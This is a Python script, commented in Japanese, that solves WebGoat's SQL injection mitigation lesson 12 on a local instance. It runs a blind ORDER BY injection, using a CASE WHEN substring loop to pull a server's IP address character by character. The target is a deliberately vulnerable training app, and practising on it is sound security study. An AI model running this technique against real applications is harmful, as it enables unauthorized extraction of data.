import json
import requests
import urllib

###
#TODO sniper_2.pyの改良を行っている
#xxx.xxx.xxx.xxxのピリオドの部分も判定できるようにする
#
#SQL injection (mitigation) lesson 12
#F12のnetworkタブからgetメソッドの通信を閲覧、編集して再送信を行い、URLパラメータにcase when (substring((select ip from servers where hostname='webgoat-prd'),1,1)=1) then id else hostname endで
#Blind SQLとORDERの特性をを応用した攻撃が通る
###


def sql_injection_adv_5():

    index=1
    numbers='0123456789.'
    numbers_num=0
    result=''
    isfinish = False

    headers={
        'Cookie': 'JSESSIONID=O6tg2QHoX_AKTTZuF4M-1vyjOouTBFZc3V-uksMv'
        # 'Cookie': 'JSESSIONID=hrY1H16D4yk_NqheEs2CgzBaNX8tQ-3wL8dICOjQ' 
        # Example here ^
    }
    #インスペクターなどを使用しクッキーの数値を取得し貼り付けること
    #下のrequests.get()内で指定するURLと対応するCOOKIEのJSESSIONID

    while True:
        url='http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+(substring((select+ip+from+servers+where+hostname%3d\'webgoat-prd\'),{},1)%3d{})+then+id+else+hostname+end'.format(index,numbers[numbers_num])

        r= requests.get(url,headers=headers)
        try:
            response =json.loads(r.text)
            
        except:
            print("Wrong JSESSIONID")
            return

        for i in range(4):
            if response[i]['id'] != str(i+1):
                numbers_num+=1 
                break
            #idが1から順に並んでいなければnumbers_numをインクリメントしてもう一度検証
            #ORDERの特性上、正しい数値が与えられていれば順に並んでいるはず
                
            if i == 3:
                print(numbers[numbers_num])
                result= result+numbers[numbers_num]
                numbers_num=0
                index+=1
        
        if numbers_num >= len(numbers):
            isfinish = True
            
        if isfinish:
            print('result='+str(result))#結果を成形し出力>終了
            return
        #numbers内に該当文字がない->何かしらのエラーもしくはアドレスの取得完了
        #isfinishをTrueにして最終的な結果を出力
                  

sql_injection_adv_5()

		